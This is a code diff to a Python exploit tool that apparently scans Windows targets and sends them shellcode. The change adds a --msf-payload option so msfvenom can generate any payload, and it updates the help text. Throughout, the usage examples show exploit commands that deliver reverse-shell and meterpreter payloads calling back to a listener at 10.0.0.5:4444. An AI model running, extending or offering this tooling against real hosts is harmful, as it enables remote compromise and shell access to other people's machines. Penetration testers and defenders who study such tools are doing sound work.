@@ -26,16 +26,17 @@ def load_shellcode_file(path):
     return shellcode
 
 
-def generate_msfvenom(lhost, lport, arch):
+DEFAULT_PAYLOADS = {
+    "x86": "windows/shell_reverse_tcp",
+    "x64": "windows/x64/shell_reverse_tcp",
+}
+
+
+def generate_msfvenom(lhost, lport, arch, msf_payload=None):
     if not shutil.which("msfvenom"):
         fatal("msfvenom not found in PATH, use --payload or -s instead")
 
-    payload_map = {
-        "x86": "windows/shell_reverse_tcp",
-        "x64": "windows/x64/shell_reverse_tcp",
-    }
-
-    payload = payload_map[arch]
+    payload = msf_payload or DEFAULT_PAYLOADS[arch]
     info(f"Generating shellcode with msfvenom ({payload})")
     info(f"LHOST={lhost} LPORT={lport} ARCH={arch}")
 
@@ -46,7 +47,6 @@ def generate_msfvenom(lhost, lport, arch):
         f"LPORT={lport}",
         "EXITFUNC=thread",
         "-f", "raw",
-        "--quiet",
     ]
 
     try:
@@ -76,22 +76,23 @@ modes:
   exploit    Send exploit to target
 
 payload options (exploit mode):
-  --payload          Built-in reverse shell (no Metasploit needed)
-  --msfvenom         Generate shellcode with msfvenom
+  --payload          Built-in meterpreter/reverse_tcp stager (x86 only)
+                     Requires: exploit/multi/handler + windows/meterpreter/reverse_tcp
+  --msfvenom         Generate shellcode with msfvenom (any payload/arch)
   -s/--shellcode     Load raw shellcode from file
 
 examples:
   Scan only:
     %(prog)s scan -t 192.168.1.10
 
-  Exploit with built-in payload (auto-detect arch):
+  Exploit with built-in payload (x86, auto-detect):
     %(prog)s exploit -t 192.168.1.10 --payload -l 10.0.0.5 -p 4444
 
-  Exploit with built-in payload (manual arch):
-    %(prog)s exploit -t 192.168.1.10 --payload -l 10.0.0.5 -p 4444 -a x64
-
-  Exploit with msfvenom:
+  Exploit with msfvenom (default shell_reverse_tcp):
     %(prog)s exploit -t 192.168.1.10 --msfvenom -l 10.0.0.5 -p 4444
+
+  Exploit with msfvenom (custom payload):
+    %(prog)s exploit -t 192.168.1.10 --msfvenom --msf-payload windows/meterpreter/reverse_tcp -l 10.0.0.5 -p 4444
 
   Exploit with custom shellcode file:
     %(prog)s exploit -t 192.168.1.10 -s shellcode.bin -a x86
@@ -118,12 +119,16 @@ disclaimer:
     )
 
     sc_group = exploit_parser.add_mutually_exclusive_group(required=True)
-    sc_group.add_argument("--payload", action="store_true", help="Built-in reverse shell (no Metasploit needed)")
+    sc_group.add_argument("--payload", action="store_true", help="Built-in meterpreter/reverse_tcp (x86, needs handler)")
     sc_group.add_argument("--msfvenom", action="store_true", help="Generate shellcode with msfvenom")
     sc_group.add_argument("-s", "--shellcode", metavar="FILE", help="Path to raw shellcode file")
 
     exploit_parser.add_argument("-l", "--lhost", help="Listener IP address")
     exploit_parser.add_argument("-p", "--lport", type=int, help="Listener port")
+    exploit_parser.add_argument(
+        "--msf-payload", metavar="PAYLOAD", default=None,
+        help="msfvenom payload (default: shell_reverse_tcp x86, x64/shell_reverse_tcp x64)",
+    )
 
     args = parser.parse_args()
 
@@ -167,7 +172,7 @@ def run_exploit(args):
     if args.payload:
         shellcode = generate_reverse_shell(args.lhost, args.lport, arch)
     elif args.msfvenom:
-        shellcode = generate_msfvenom(args.lhost, args.lport, arch)
+        shellcode = generate_msfvenom(args.lhost, args.lport, arch, args.msf_payload)
     else:
         shellcode = load_shellcode_file(args.shellcode)
 
